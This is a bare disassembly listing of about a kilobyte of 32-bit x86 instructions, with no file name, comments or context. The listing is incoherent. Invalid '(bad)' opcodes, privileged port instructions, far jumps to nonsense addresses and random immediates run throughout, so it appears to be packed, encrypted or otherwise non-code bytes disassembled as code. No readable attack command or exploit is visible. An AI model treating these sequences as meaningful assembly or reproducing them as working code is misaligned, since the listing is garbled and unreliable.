  40dad7:	or     DWORD PTR [edi],ebp
  40dad9:	jo     0x40db4e
  40dadb:	adc    DWORD PTR [esi+0x59],ebp
  40dade:	sar    DWORD PTR [edi],1
  40dae0:	or     al,0x2
  40dae2:	dec    ecx
  40dae3:	push   edi
  40dae4:	out    0xc3,al
  40dae6:	ret    0x185e
  40dae9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daea:	dec    esi
  40daeb:	inc    edx
  40daec:	(bad)  
  40daed:	mov    bh,0xc4
  40daef:	(bad)  
  40daf0:	jle    0x40daf2
  40daf2:	jmp    0xf1600bf5
  40daf7:	iret   
  40daf8:	mov    esi,DWORD PTR [ebp+0x1f]
  40dafb:	out    0xed,eax
  40dafd:	push   0x7
  40daff:	sub    DWORD PTR [eax+edi*2+0x742594ec],esi
  40db06:	aam    0x66
  40db08:	fucomp st(4)
  40db0a:	fwait
  40db0b:	mov    ah,0x85
  40db0d:	xchg   ebp,edx
  40db0f:	and    al,0x5f
  40db11:	sub    ecx,ecx
  40db13:	popa   
  40db14:	cli    
  40db15:	pop    ebx
  40db16:	mov    fs,WORD PTR [ebp-0x35]
  40db19:	inc    esp
  40db1a:	std    
  40db1b:	dec    esp
  40db1c:	push   ebp
  40db1d:	dec    esp
  40db1e:	inc    edi
  40db1f:	pop    edi
  40db20:	daa    
  40db21:	daa    
  40db22:	adc    eax,0xa0d62202
  40db27:	scas   al,BYTE PTR es:[edi]
  40db28:	fld    QWORD PTR [ecx-0x6818d9d2]
  40db2e:	leave  
  40db2f:	mov    eax,0xe912b368
  40db34:	sub    al,0x97
  40db36:	dec    ebx
  40db37:	repz call 0x672be380
  40db3d:	jp     0x40dba7
  40db3f:	jb     0x40db37
  40db41:	jnp    0x40dba6
  40db43:	pop    ebx
  40db44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db45:	and    al,0x93
  40db47:	(bad)  
  40db48:	fdiv   DWORD PTR [ebx+0x250b239c]
  40db4e:	lock jmp 0x40db32
  40db51:	cs xchg ebp,eax
  40db53:	fisttp WORD PTR [eax-0x16]
  40db56:	in     al,0x1d
  40db58:	sbb    al,0xb4
  40db5a:	sub    al,0x1d
  40db5c:	cmp    al,dh
  40db5e:	push   0x30333a75
  40db63:	or     esp,ebp
  40db65:	rol    DWORD PTR [ecx+0x5d],0xcd
  40db69:	or     BYTE PTR [eax],cl
  40db6b:	fstp   DWORD PTR [edi+0x24ec2b22]
  40db71:	mov    al,0xcf
  40db73:	daa    
  40db74:	cmp    esi,ebp
  40db76:	loopne 0x40db16
  40db78:	fild   DWORD PTR [edi]
  40db7a:	xchg   BYTE PTR [eax+ecx*1+0x4ca03c4d],ah
  40db81:	sbb    al,0x32
  40db83:	jecxz  0x40db6a
  40db85:	repnz or ah,BYTE PTR [eax+edx*2+0x41]
  40db8a:	je     0x40db75
  40db8c:	mov    ebx,0x5ee427b1
  40db91:	cwde   
  40db92:	push   0xffffffb1
  40db94:	push   0xe2a516dc
  40db99:	fwait
  40db9a:	inc    esi
  40db9b:	test   eax,0xf0041b4
  40dba0:	pop    esp
  40dba1:	fstp   TBYTE PTR [eax-0x20]
  40dba4:	xchg   ecx,eax
  40dba5:	adc    ebp,esi
  40dba7:	in     eax,dx
  40dba8:	jg     0x40db30
  40dbaa:	mov    eax,ds:0xe663cce3
  40dbaf:	and    eax,0xf0e4117d
  40dbb4:	mul    BYTE PTR ss:[edi]
  40dbb7:	pop    esp
  40dbb8:	mov    cl,BYTE PTR [edx+0x1d]
  40dbbb:	mov    bl,0xac
  40dbbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbbe:	jle    0x40dc07
  40dbc0:	adc    al,bl
  40dbc2:	(bad)  
  40dbc3:	test   al,0x54
  40dbc5:	xor    DWORD PTR [ecx],eax
  40dbc7:	sub    DWORD PTR [ebx-0x11],edi
  40dbca:	into   
  40dbcb:	xor    eax,0xbc47a8ae
  40dbd0:	test   BYTE PTR [ebx+0x68b30a6b],0xf8
  40dbd7:	sbb    esi,DWORD PTR [ebx+0xc74fb2]
  40dbdd:	mov    BYTE PTR [esi-0x14],ah
  40dbe0:	ds cld 
  40dbe2:	adc    dl,dl
  40dbe4:	jnp    0x40db84
  40dbe6:	push   0xffffff9f
  40dbe8:	cmp    ecx,DWORD PTR [esi+0xa]
  40dbeb:	les    esi,FWORD PTR [ecx-0x4b]
  40dbee:	fisttp QWORD PTR [edx-0x36ee2cbb]
  40dbf4:	sub    DWORD PTR [esi+0x63],edi
  40dbf7:	cmp    ch,BYTE PTR [edx+0x44430a92]
  40dbfd:	in     al,dx
  40dbfe:	mov    cl,0x4
  40dc00:	gs inc edx
  40dc02:	loop   0x40dbee
  40dc04:	push   es
  40dc05:	pop    ebx
  40dc06:	pop    ds
  40dc07:	or     al,0x7f
  40dc09:	js     0x40dc02
  40dc0b:	mov    DWORD PTR [ebp+0x564c0e96],eax
  40dc11:	dec    edx
  40dc12:	mov    eax,0xb2945c4f
  40dc17:	fsub   st(0),st
  40dc19:	jae    0x40dc08
  40dc1b:	mov    eax,ds
  40dc1d:	jp     0x40dba3
  40dc1f:	adc    ah,BYTE PTR ss:[eax]
  40dc22:	xchg   ebp,eax
  40dc23:	and    BYTE PTR [eax+0x38],ch
  40dc26:	sub    al,0x76
  40dc28:	xor    al,0xaf
  40dc2a:	aas    
  40dc2b:	push   edi
  40dc2c:	pop    ds
  40dc2d:	fnstsw WORD PTR [ebx]
  40dc2f:	mov    ah,0x23
  40dc31:	jne    0x40dc72
  40dc33:	xor    al,0xf7
  40dc35:	imul   edx,ecx,0x817634cc
  40dc3b:	add    BYTE PTR [ebx+eax*8+0x2cf764a4],cl
  40dc42:	xor    al,0x8
  40dc44:	and    ebp,DWORD PTR [edi-0x78]
  40dc47:	pop    ds
  40dc48:	xchg   BYTE PTR [eax+esi*8+0x77],dh
  40dc4c:	dec    ebp
  40dc4d:	bound  ebp,QWORD PTR [ebx-0x43]
  40dc50:	add    BYTE PTR [eax],bl
  40dc52:	jb     0x40dca5
  40dc54:	lods   al,BYTE PTR ds:[esi]
  40dc55:	mov    ss,WORD PTR [edx-0x31]
  40dc58:	xchg   BYTE PTR [eax+0x4e],dh
  40dc5b:	xchg   edx,eax
  40dc5c:	jb     0x40dc51
  40dc5e:	not    DWORD PTR [ecx-0x66]
  40dc61:	(bad)  
  40dc62:	and    BYTE PTR [ebx-0xf],cl
  40dc65:	add    al,0xb3
  40dc67:	adc    DWORD PTR [edi],ecx
  40dc69:	int    0x4
  40dc6b:	or     BYTE PTR [edi+0x3f],0x17
  40dc6f:	and    dh,bl
  40dc71:	mov    esp,0x3bcef080
  40dc76:	mov    dh,0x54
  40dc78:	add    cl,cl
  40dc7a:	inc    edi
  40dc7b:	sub    eax,0xfb701f70
  40dc80:	mov    al,0x20
  40dc82:	push   cs
  40dc83:	lahf   
  40dc84:	fiadd  DWORD PTR ds:0x81691ed0
  40dc8a:	ins    BYTE PTR es:[edi],dx
  40dc8b:	mov    ebx,0x49b0096c
  40dc90:	mov    esp,0xa6f451b6
  40dc95:	mov    ch,al
  40dc97:	(bad)  
  40dc98:	int    0xa9
  40dc9a:	xchg   ebx,eax
  40dc9b:	retf   0x9481
  40dc9e:	mov    dl,0x6c
  40dca0:	loope  0x40dc8e
  40dca2:	mov    edx,0xf41c739f
  40dca7:	ja     0x40dd08
  40dca9:	sahf   
  40dcaa:	push   edi
  40dcab:	imul   ecx,DWORD PTR [edi-0xb76dbde],0xe9c1a4ed
  40dcb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcb6:	rcl    BYTE PTR [ebp-0x2428b07e],cl
  40dcbc:	jle    0x40dca4
  40dcbe:	ret    
  40dcbf:	fs push ebp
  40dcc1:	neg    esp
  40dcc3:	cld    
  40dcc4:	pusha  
  40dcc5:	rol    DWORD PTR [ecx],0x60
  40dcc8:	lods   al,BYTE PTR ds:[esi]
  40dcc9:	out    0x84,eax
  40dccb:	jnp    0x40dd06
  40dccd:	dec    esp
  40dcce:	dec    edx
  40dccf:	leave  
  40dcd0:	enter  0x6b9e,0x11
  40dcd4:	(bad)  
  40dcd6:	pop    ss
  40dcd7:	sahf   
  40dcd8:	jmp    0x40dcf2
  40dcda:	mov    esp,0xee83d7d3
  40dcdf:	or     esi,eax
  40dce1:	test   al,0x3c
  40dce3:	lods   al,BYTE PTR ds:[esi]
  40dce4:	cmc    
  40dce5:	push   ds
  40dce6:	push   0x46281d95
  40dceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcec:	in     al,0x54
  40dcee:	lods   al,BYTE PTR ds:[esi]
  40dcef:	and    DWORD PTR [ecx],eax
  40dcf1:	cmp    bh,dh
  40dcf3:	push   ecx
  40dcf4:	xor    esp,DWORD PTR [edi+ebp*1+0x4]
  40dcf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcf9:	or     DWORD PTR [ebp-0x4bae1cab],edi
  40dcff:	adc    BYTE PTR ds:0x3c1fb735,bh
  40dd05:	stos   DWORD PTR es:[edi],eax
  40dd06:	mov    DWORD PTR [esi+0x4b],esp
  40dd09:	nop
  40dd0a:	xchg   DWORD PTR [edi],edi
  40dd0c:	cmp    al,0xd6
  40dd0e:	push   ds
  40dd0f:	nop
  40dd10:	push   cs
  40dd11:	push   eax
  40dd12:	jno    0x40dd24
  40dd14:	pop    ebp
  40dd15:	out    dx,eax
  40dd16:	xlat   BYTE PTR ds:[ebx]
  40dd17:	cmp    DWORD PTR [edi],edi
  40dd19:	in     eax,dx
  40dd1a:	stos   BYTE PTR es:[edi],al
  40dd1b:	xlat   BYTE PTR ds:[ebx]
  40dd1c:	cwde   
  40dd1d:	clc    
  40dd1e:	mov    dl,0x63
  40dd20:	(bad)  
  40dd21:	push   esi
  40dd22:	or     al,0x5b
  40dd24:	jb     0x40dd98
  40dd26:	sub    DWORD PTR [esi-0x61b5b101],esp
  40dd2c:	jle    0x40dcf7
  40dd2e:	rol    DWORD PTR [ecx],cl
  40dd30:	in     eax,0xf2
  40dd32:	mov    ebx,0x8bf58778
  40dd37:	jp     0x40dd7c
  40dd39:	pop    ebp
  40dd3a:	(bad)  
  40dd3b:	xlat   BYTE PTR ds:[ebx]
  40dd3c:	push   ds
  40dd3d:	jecxz  0x40dd9e
  40dd3f:	mov    ecx,0x5e76ab35
  40dd44:	retf   0xf3f1
  40dd47:	xchg   ebx,eax
  40dd48:	retf   0x52e
  40dd4b:	mov    BYTE PTR [edi+0x26],cl
  40dd4e:	out    dx,eax
  40dd4f:	fstp   QWORD PTR [ebx+0xeb0c165]
  40dd55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd56:	in     eax,0x8b
  40dd58:	mov    esi,0x33405e48
  40dd5d:	push   ds
  40dd5e:	xor    ebp,esp
  40dd60:	lea    esp,[ecx+eax*2+0x36]
  40dd64:	outs   dx,DWORD PTR ds:[esi]
  40dd65:	pop    edx
  40dd66:	aaa    
  40dd67:	shl    BYTE PTR [eax+eiz*2+0x2c],cl
  40dd6b:	mov    ch,0xca
  40dd6d:	ror    BYTE PTR [eax+ecx*8+0x24],0xab
  40dd72:	adc    bl,bl
  40dd74:	pop    ecx
  40dd75:	and    BYTE PTR [edi+0x69],dl
  40dd78:	push   es
  40dd79:	adc    eax,0xca58b65b
  40dd7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd7f:	inc    edx
  40dd80:	jecxz  0x40dd13
  40dd82:	icebp  
  40dd83:	(bad)  
  40dd84:	adc    DWORD PTR [edx],ebx
  40dd86:	jmp    0x40dd7a
  40dd88:	mov    WORD PTR [ecx],cs
  40dd8a:	and    dh,BYTE PTR [esi-0x43]
  40dd8d:	adc    eax,0x44df2f12
  40dd92:	jbe    0x40dda8
  40dd94:	unpckhps xmm6,XMMWORD PTR [edx]
  40dd97:	cmp    esi,DWORD PTR [ebx-0x1f]
  40dd9a:	inc    edx
  40dd9b:	ds push edi
  40dd9d:	repz cdq 
  40dd9f:	add    al,0xa9
  40dda1:	xchg   ebp,eax
  40dda2:	dec    edi
  40dda3:	(bad)  
  40dda4:	jge    0x40ddf2
  40dda6:	push   edi
  40dda7:	jl     0x40dd7d
  40dda9:	and    eax,0xa44173af
  40ddae:	dec    ebx
  40ddaf:	mov    BYTE PTR [ebp+edx*2-0x63900437],dh
  40ddb6:	and    bh,cl
  40ddb8:	pop    edi
  40ddb9:	sub    DWORD PTR [eax+0x1f],eax
  40ddbc:	in     eax,dx
  40ddbd:	push   esi
  40ddbe:	loop   0x40dd7f
  40ddc0:	push   edx
  40ddc1:	mov    cs,ebp
  40ddc3:	pop    ecx
  40ddc4:	pusha  
  40ddc5:	sbb    al,0xc0
  40ddc7:	add    al,BYTE PTR ds:0xa8307a51
  40ddcd:	inc    ebx
  40ddce:	push   ds
  40ddcf:	sbb    bl,BYTE PTR [ebp-0x1b]
  40ddd2:	push   edx
  40ddd3:	jge    0x40de33
  40ddd5:	adc    BYTE PTR [edi+0x54742fb3],dh
  40dddb:	or     DWORD PTR [ebx],ebp
  40dddd:	ds pop ss
  40dddf:	mov    ds:0x27e7bc50,eax
  40dde4:	pop    ds
  40dde5:	or     DWORD PTR [edi-0x2c],ebp
  40dde8:	dec    ebp
  40dde9:	push   edi
  40ddea:	pop    es
  40ddeb:	add    bh,BYTE PTR [edx-0x5b644a7d]
  40ddf1:	or     edi,DWORD PTR [eax]
  40ddf3:	or     eax,0xa7ba2a1c
  40ddf8:	(bad)  
  40ddf9:	in     al,0x3c
  40ddfb:	retf   
  40ddfc:	mov    al,ds:0x105b4bb5
  40de01:	mov    al,ds:0x5991cd31
  40de06:	(bad)  
  40de08:	add    ch,BYTE PTR [edx]
  40de0a:	dec    edx
  40de0b:	outs   dx,DWORD PTR ds:[esi]
  40de0c:	adc    DWORD PTR [edx+0x28],ebx
  40de0f:	(bad)  
  40de11:	xor    ch,BYTE PTR [ebp-0x63]
  40de14:	int    0x58
  40de16:	in     al,dx
  40de17:	lds    ebp,FWORD PTR [ebp-0x1b]
  40de1a:	push   0xffffffef
  40de1c:	jp     0x40dda4
  40de1e:	and    edx,edx
  40de20:	jmp    0x2d5f55d7
  40de25:	mov    bl,BYTE PTR [eax+0xf19d48e]
  40de2b:	jle    0x40de95
  40de2d:	sbb    DWORD PTR [ecx],0xb3f93874
  40de33:	lods   eax,DWORD PTR ds:[esi]
  40de34:	mov    edi,0x9c008f03
  40de39:	iret   
  40de3a:	add    BYTE PTR [ecx+0x6f89c37e],0xb2
  40de41:	repz test BYTE PTR [esi+0x221468d4],cl
  40de48:	es pop ebx
  40de4a:	sahf   
  40de4b:	int    0x4d
  40de4d:	shr    DWORD PTR [esi+ebx*4+0xa58f42f],0x9a
  40de55:	adc    ebx,esp
  40de57:	xchg   ebx,eax
  40de58:	xchg   BYTE PTR [edx+edi*8+0x17063ff6],dl
  40de5f:	mov    ebx,0x11c57eb5
  40de64:	rcl    BYTE PTR [ebx+0x57],1
  40de67:	mov    edx,0xca1ac54f
  40de6c:	cs mov esi,0x741abf23
  40de72:	push   es
  40de73:	push   ebp
  40de74:	fild   DWORD PTR [ecx-0x1e2f2c97]
  40de7a:	inc    eax
  40de7b:	push   eax
  40de7c:	stos   BYTE PTR es:[edi],al
  40de7d:	jo     0x40de62
  40de7f:	loop   0x40de05
  40de81:	mov    esi,0xf6cadda
  40de86:	pop    ss
  40de87:	daa    
  40de88:	pop    edi
  40de89:	add    dl,ah
  40de8b:	or     eax,0xd9b1ec0c
  40de90:	lods   al,BYTE PTR ds:[esi]
  40de91:	mov    ebx,0xb0aab488
  40de96:	pop    ds
  40de97:	add    eax,0x9dbd2100
  40de9c:	adc    al,0x6f
  40de9e:	jae    0x40de9f
  40dea0:	ins    BYTE PTR es:[edi],dx
  40dea1:	imul   ebp
  40dea3:	arpl   bx,di
  40dea5:	loope  0x40debc
  40dea7:	lea    esp,[esi-0x54fa2be2]
  40dead:	dec    esi
  40deae:	jmp    DWORD PTR [ecx+0x63]
  40deb1:	add    eax,0xc3abd347
  40deb6:	pop    edi
  40deb7:	retf   
  40deb8:	jmp    0x5b2f:0x58f26741
  40debf:	sub    esp,DWORD PTR [esi+0x1044d331]
  40dec5:	cwde   
  40dec6:	inc    edx
  40dec7:	ror    BYTE PTR [ecx-0x5b8f0208],0x11
  40dece:	jb     0x40dee1
  40ded0:	xchg   ebx,eax
  40ded1:	jecxz  0x40dead
  40ded3:	stos   BYTE PTR es:[edi],al
  40ded4:	inc    ecx
  40ded5:	hlt    
  40ded6:	xor    eax,0xac68f13
  40dedb:	sub    eax,0xd13e9b94
  40dee0:	dec    edx
  40dee1:	push   esp
  40dee2:	sub    bl,ch
  40dee4:	es cmp eax,0x731dd8c4
  40deea:	dec    eax
  40deeb:	sub    DWORD PTR [esi],edi
  40deed:	xchg   esp,eax
  40deee:	mov    edx,0xaac614d
  40def3:	das    
  40def4:	push   ecx
  40def5:	dec    ebp
  40def6:	(bad)  
  40def7:	jo     0x40df2d
  40def9:	cli    
  40defa:	arpl   WORD PTR [edx+0x764a1c4f],dx
  40df00:	cmp    ebx,DWORD PTR [ebx]
  40df02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df03:	dec    edx
  40df04:	push   eax
  40df05:	(bad)  
  40df06:	bound  esi,QWORD PTR [esi+0x1e954f3e]
  40df0c:	enter  0xee45,0xce
  40df10:	movaps xmm6,XMMWORD PTR [ecx+0x6dc84b16]
  40df17:	ins    BYTE PTR es:[edi],dx
  40df18:	xchg   cl,bh
  40df1a:	std    
  40df1b:	pop    es
  40df1c:	mov    dh,0xda
  40df1e:	data16 or bl,BYTE PTR [edi]
  40df21:	aad    0x86
  40df23:	gs push edx
  40df25:	pop    eax
  40df26:	push   ebp
  40df27:	nop
  40df28:	or     DWORD PTR [edx+esi*1-0x7d],ebx
  40df2c:	push   esp
  40df2d:	lds    eax,FWORD PTR [ecx]
  40df2f:	clc    
  40df30:	aam    0xb8
  40df32:	add    BYTE PTR [ecx+0x262f09bd],bl
  40df38:	or     eax,0x1397e9a5
  40df3d:	push   ecx
  40df3e:	xchg   ebp,eax
  40df3f:	data16 cld 
  40df41:	inc    esi
  40df42:	rol    BYTE PTR [ecx+0x13dce9f0],0x74
  40df49:	add    DWORD PTR [esi],ecx
  40df4b:	sbb    DWORD PTR [eax-0xd],0x67
  40df4f:	xor    al,0x3f
  40df51:	xchg   edx,eax
  40df52:	aam    0xec
  40df54:	cld    
  40df55:	sbb    eax,0x18801296
  40df5a:	dec    ebx
  40df5b:	pop    edx
  40df5c:	out    0xa3,eax
  40df5e:	xor    eax,0xd1652212
  40df63:	inc    ebp
  40df64:	test   edx,ecx
  40df66:	xor    ecx,edx
  40df68:	bound  ebp,QWORD PTR [ecx-0x1a7c4175]
  40df6e:	(bad)  
  40df6f:	clc    
  40df70:	ss icebp 
  40df72:	int3   
  40df73:	cmp    DWORD PTR [eax],esp
  40df75:	sbb    BYTE PTR [edx-0x2733485e],cl
  40df7b:	das    
  40df7c:	rcl    BYTE PTR [ebx],1
  40df7e:	xor    esp,DWORD PTR [esi-0x10285ee1]
  40df84:	test   eax,0x890b1e54
  40df89:	ror    DWORD PTR [eax],cl
  40df8b:	mov    cl,BYTE PTR [ebx+0x7d354172]
  40df91:	jg     0x40dff6
  40df93:	push   0x8671627a
  40df98:	popa   
  40df99:	(bad)  [esi]
  40df9b:	jb     0x40dfb8
  40df9d:	sub    ch,BYTE PTR [edx]
  40df9f:	push   ebp
  40dfa0:	dec    ebx
  40dfa1:	shl    DWORD PTR [ecx+ebp*1-0x3701efe8],1
  40dfa8:	adc    al,0x70
  40dfaa:	cwde   
  40dfab:	push   edi
  40dfac:	xchg   ebx,eax
  40dfad:	xlat   BYTE PTR ds:[ebx]
  40dfae:	daa    
  40dfaf:	ror    dl,cl
  40dfb1:	mov    ecx,esp
  40dfb3:	add    eax,0xa41def53
  40dfb8:	repnz ins BYTE PTR es:[edi],dx
  40dfba:	inc    ebx
  40dfbb:	inc    edx
  40dfbc:	(bad)  
  40dfbd:	imul   edi,DWORD PTR [ebp+0x4d],0x33c7daea
  40dfc4:	push   eax
  40dfc5:	out    0x9e,eax
  40dfc7:	mov    eax,0x8850dcce
  40dfcc:	jno    0x40df7d
  40dfce:	ret    
  40dfcf:	mov    bl,0x17
  40dfd1:	add    al,0x39
  40dfd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfd4:	fstp   QWORD PTR [eax+0x70]
  40dfd7:	icebp  
  40dfd8:	push   edx
  40dfd9:	(bad)  
  40dfda:	sti    
  40dfdb:	xchg   DWORD PTR [edi+0x79],esp
  40dfde:	mov    ah,0x20
  40dfe0:	and    al,0x9d
  40dfe2:	inc    ecx
  40dfe3:	mov    edi,0xeb729bf1
  40dfe8:	jle    0x40dfb3
  40dfea:	int    0x6a
  40dfec:	(bad)  
  40dfed:	xchg   edi,eax
  40dfee:	and    ch,BYTE PTR [ecx+edx*1]
  40dff1:	push   es
  40dff2:	pop    esi
  40dff3:	cmp    eax,0x8fe5d7a4
  40dff8:	stc    
  40dff9:	mov    dl,0xbf
  40dffb:	xchg   DWORD PTR [eax],ebx
  40dffd:	mov    DWORD PTR [ebp+0x6fccb2c8],ebp
  40e003:	dec    esp
  40e004:	les    edx,FWORD PTR [eax+ecx*2-0x50]
  40e008:	lock call 0x850b2c16
  40e00e:	das    
  40e00f:	neg    DWORD PTR [esi]
  40e011:	inc    edx
  40e012:	jnp    0x40e046
  40e014:	(bad)  
  40e015:	loopne 0x40e000
  40e017:	pop    ebx
  40e018:	adc    cl,BYTE PTR [eax+edx*4-0x4113c535]
  40e01f:	push   ebp
  40e020:	scas   al,BYTE PTR es:[edi]
  40e021:	jl     0x40e075
  40e023:	out    dx,al
  40e024:	ins    BYTE PTR es:[edi],dx
  40e025:	jmp    0x4656eaca
  40e02a:	mov    dl,BYTE PTR [eax]
  40e02c:	xor    eax,0x6b2f8b7
  40e031:	inc    edi
  40e032:	fmul   st,st(7)
  40e034:	inc    ecx
  40e035:	add    esp,eax
  40e037:	std    
  40e038:	mov    bl,0xf5
  40e03a:	pop    ebp
  40e03b:	fmul   DWORD PTR [ecx-0x30fd48b5]
  40e041:	push   0x5400e58f
  40e046:	mov    ds:0xc1e764cd,eax
  40e04b:	nop
  40e04c:	lods   al,BYTE PTR ds:[esi]
  40e04d:	loopne 0x40e0c1
  40e04f:	popa   
  40e050:	lahf   
  40e051:	cwde   
  40e052:	mov    al,0x7c
  40e054:	pop    ecx
  40e055:	or     al,0x18
  40e057:	dec    ecx
  40e058:	lods   eax,DWORD PTR ds:[esi]
  40e059:	popa   
  40e05a:	sbb    eax,0x41c50078
  40e05f:	push   0x35c54447
  40e064:	inc    ebx
  40e065:	je     0x40e0d9
  40e067:	pop    ebx
  40e068:	(bad)  
  40e069:	(bad)  
  40e06a:	bound  esi,QWORD PTR [ebx-0x1a2ab600]
  40e070:	stc    
  40e071:	pop    esi
  40e072:	inc    ecx
  40e073:	and    al,0x97
  40e075:	mov    ebx,0x860ea0b9
  40e07a:	hlt    
  40e07b:	jae    0x40e009
  40e07d:	and    DWORD PTR [eax],eax
  40e07f:	loop   0x40e07e
  40e081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e082:	rcr    BYTE PTR [eax+0x31],0x25
  40e086:	adc    al,0x4d
  40e088:	sub    edi,edi
  40e08a:	ret    
  40e08b:	int3   
  40e08c:	pop    ds
  40e08d:	daa    
  40e08e:	sbb    eax,eax
  40e090:	sub    eax,0x6a39863
  40e095:	test   eax,0x9692d5c
  40e09a:	inc    eax
  40e09b:	xchg   BYTE PTR [esi+0x17f61ec0],cl
  40e0a1:	dec    ecx
  40e0a2:	rcl    BYTE PTR [ebp-0x66],0x13
  40e0a6:	mov    ebx,0xf2dbd04e
  40e0ab:	pushf  
  40e0ac:	js     0x40e03a
  40e0ae:	stos   BYTE PTR es:[edi],al
  40e0af:	and    bl,BYTE PTR [edx]
  40e0b1:	push   ss
  40e0b2:	jbe    0x40e0f0
  40e0b4:	xor    ebp,DWORD PTR [ebp-0x203a9793]
  40e0ba:	add    DWORD PTR [ebp-0x6a7f2be9],ebp
  40e0c0:	aam    0x65
  40e0c2:	or     dh,0xf8
  40e0c5:	sbb    cl,BYTE PTR ss:[edx-0x6288487]
  40e0cc:	fcom   st(2)
  40e0ce:	inc    esi
  40e0cf:	mov    ebp,0x4bb507f9
  40e0d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0d5:	(bad)  
  40e0d6:	mov    bl,0x8e
  40e0d8:	pop    ebx
  40e0d9:	push   cs
  40e0da:	nop
  40e0db:	leave  
  40e0dc:	or     bh,dl
  40e0de:	mov    dh,0x63
  40e0e0:	jno    0x40e161
  40e0e2:	and    BYTE PTR [edi+0x6c],cl
  40e0e5:	ret    
  40e0e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0e7:	sub    al,0x2b
  40e0e9:	shl    eax,cl
  40e0eb:	cmp    bh,ah
  40e0ed:	jle    0x40e158
  40e0ef:	ins    BYTE PTR es:[edi],dx
  40e0f0:	or     DWORD PTR [ecx+ebx*4+0x4c],eax
  40e0f4:	cmp    DWORD PTR [di+0x646a],0x21
  40e0fa:	mov    ch,0x4f
  40e0fc:	test   ebp,0xc96a92a6
  40e102:	mov    al,ds:0x5213f781
  40e107:	pop    esi
  40e108:	les    ebp,FWORD PTR [ebp+0x4e061555]
  40e10e:	xlat   BYTE PTR ds:[ebx]
  40e10f:	pop    ebx
  40e110:	lods   al,BYTE PTR ds:[esi]
  40e111:	lahf   
  40e112:	in     al,0xc9
  40e114:	lods   al,BYTE PTR ds:[esi]
  40e115:	dec    eax
  40e116:	pop    ebx
  40e117:	pusha  
  40e118:	cmp    al,0xb3
  40e11a:	cs stos DWORD PTR es:[edi],eax
  40e11c:	loop   0x40e0f2
  40e11e:	pop    esp
  40e11f:	jle    0x40e108
  40e121:	(bad)  
  40e122:	sbb    eax,0xd3d919ba
  40e127:	cs push ds
  40e129:	call   0xfd39:0xa2d4b6ac
  40e130:	and    ebp,DWORD PTR ds:0x450a46d2
  40e136:	or     BYTE PTR [eax+0x41],ch
  40e139:	add    al,0x9
  40e13b:	iret   
  40e13c:	mov    edi,0xfb226d93
  40e141:	inc    ebp
  40e142:	push   ebx
  40e143:	mov    esp,0x24d7a5e6
  40e148:	sub    cl,BYTE PTR [edi+0x6c9263d4]
  40e14e:	in     al,dx
  40e14f:	pop    ecx
  40e150:	gs sahf 
  40e152:	inc    edx
  40e153:	dec    edi
  40e154:	dec    ebx
  40e155:	or     BYTE PTR [ecx-0x250dacfe],ch
  40e15b:	aaa    
  40e15c:	fisubr WORD PTR [edx+0x5d8b5bc4]
  40e162:	fs jnp 0x40e11a
  40e165:	mov    esi,0x49a9e277
  40e16a:	sub    eax,0x6fdccfc
  40e16f:	mov    al,0x57
  40e171:	sbb    eax,0x67
  40e174:	in     al,0x2d
  40e176:	mov    ds:0xf0b481,al
  40e17b:	add    DWORD PTR [ebx],edi
  40e17d:	retf   
  40e17e:	sar    DWORD PTR [edi],0x3
  40e181:	xor    cl,bl
  40e183:	mov    edi,0x9f8e7da1
  40e188:	sub    DWORD PTR [edx+0x1d40fb10],esp
  40e18e:	out    dx,eax
  40e18f:	out    dx,eax
  40e190:	lock lock retf 0xbb7b
  40e195:	add    al,0x67
  40e197:	ins    DWORD PTR es:[edi],dx
  40e198:	das    
  40e199:	bound  ecx,QWORD PTR [esi-0x33dbe5cf]
  40e19f:	mov    ebx,ecx
  40e1a1:	adc    dh,bh
  40e1a3:	or     ah,BYTE PTR [ecx+eiz*8+0x51]
  40e1a7:	jns    0x40e19f
  40e1a9:	inc    esi
  40e1aa:	jae    0x40e200
  40e1ac:	ins    DWORD PTR es:[edi],dx
  40e1ad:	jae    0x40e189
  40e1af:	mov    al,ds:0x64ffea8a
  40e1b4:	ins    BYTE PTR es:[edi],dx
  40e1b5:	and    eax,0x85bc28a1
  40e1ba:	xor    BYTE PTR ds:0xb83021fc,bh
  40e1c0:	loopne 0x40e1dd
  40e1c2:	pop    DWORD PTR [ebp-0x11f2bc3e]
  40e1c8:	sub    DWORD PTR [eax-0x56],ebp
  40e1cb:	sahf   
  40e1cc:	into   
  40e1cd:	repnz add bh,al
  40e1d0:	pop    es
  40e1d1:	loop   0x40e1b5
  40e1d3:	ins    BYTE PTR es:[edi],dx
  40e1d4:	ret    0x7dc4
  40e1d7:	mov    eax,0xa1f03153
  40e1dc:	inc    edi
  40e1dd:	push   ebx
  40e1de:	cld    
  40e1df:	fld    TBYTE PTR [ebx]
  40e1e1:	mov    cl,0x74
  40e1e3:	pop    es
  40e1e4:	dec    eax
  40e1e5:	fisubr WORD PTR [esi+0x3b]
  40e1e8:	push   esi
  40e1e9:	test   al,0x7e
  40e1eb:	gs aad 0xb3
  40e1ee:	(bad)  
  40e1ef:	mov    cl,0x9e
  40e1f1:	js     0x40e191
  40e1f3:	stos   DWORD PTR es:[edi],eax
  40e1f4:	mov    edi,DWORD PTR [esi+0x4927c373]
  40e1fa:	repz xor DWORD PTR [ecx],ecx
  40e1fd:	sbb    BYTE PTR [edi],0xd2
  40e200:	imul   eax,DWORD PTR [edx+0x6fa9f903],0x33abce0f
  40e20a:	stos   BYTE PTR es:[edi],al
  40e20b:	sahf   
  40e20c:	daa    
  40e20d:	jmp    DWORD PTR [edi]
  40e20f:	repz shl DWORD PTR ss:[edx],0x9b
  40e214:	sub    BYTE PTR [esi-0x43],al
  40e217:	pop    es
  40e218:	mov    ecx,0xd191852e
  40e21d:	std    
